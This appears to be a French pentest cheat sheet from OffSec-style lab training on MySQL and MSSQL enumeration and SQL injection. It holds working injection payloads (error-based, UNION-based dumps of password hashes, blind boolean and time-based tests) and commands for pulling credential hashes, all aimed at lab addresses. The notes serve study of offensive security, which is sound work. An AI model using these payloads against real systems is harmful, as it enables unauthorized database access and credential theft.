
### MySQL

```bash
# Basique qery pour chercher un user dans une db mysql

SELECT * FROM users WHERE user_name='admin'

# Pour se connecter à une db mysql

mysql -u root -p'root' -h <ip> -P 3306

# Si l'erreur ERROR 2026 (HY000) TLS/SSL apparait lors de la connexion, il faudra rajouter l'arg  --skip-ssl-verify-server-cert
```

```bash
# Voir la version d'une db mysql
MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)
```

```bash
# Voir qui est log à la db
select system_user();
+--------------------+
| system_user()      |
+--------------------+
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```

```bash
# Voir les databases présente
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

```bash
# Retrouver le password d'un user
MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
+--------+------------------------------------------------------------------------+
1 row in set (0.106 sec)

```

### MSSQL

```bash
# Se connecter à MSSQL
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SQLPLAYGROUND\Administrator  dbo@master)>
```

```bash
# Afficher la version
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;
...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
```

```bash
#Pour afficher les databases
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec

SQL>
```

```bash
# Récuperer les tables de la db offsec
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
offsec          dbo            users        b'BASE TABLE'   

SQL (SQLPLAYGROUND\Administrator  dbo@master)>
```

```bash
# Voir le contenu de la table users
SQL>select * from offsec.dbo.users;
username     password     
----------   ----------   
admin        lab        

guest        guest
```


### Identifier une sqli via error

```sql
admin' OR 1=1 -- //
```

```sql
SELECT * FROM users WHERE user_name= 'admin' OR 1=1 --
```

```sql
récupérer la version
' or 1=1 in (select @@version) -- //
```

```sql
récupérer le password d un user

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## UNION-based Payloads

```sql
Découvrir le nombre de colones 

' ORDER BY 1-- //
```

```sql
Afficher les colones

%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

```sql
Dump le user et le nom et version de la db
%' UNION SELECT database(), user(), @@version, null, null -- //

ou

' UNION SELECT null, null, database(), user(), @@version  -- //
```

```sql
Enumerer 

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

```sql
Dump les hashs

' UNION SELECT null, username, password, description, null FROM users -- //
```

## Blind Sqli

```
To test for boolean-based SQLi, we can try to append the below payload to the URL:

http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

```
We can achieve the same result by using a time-based SQLi payload:

http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
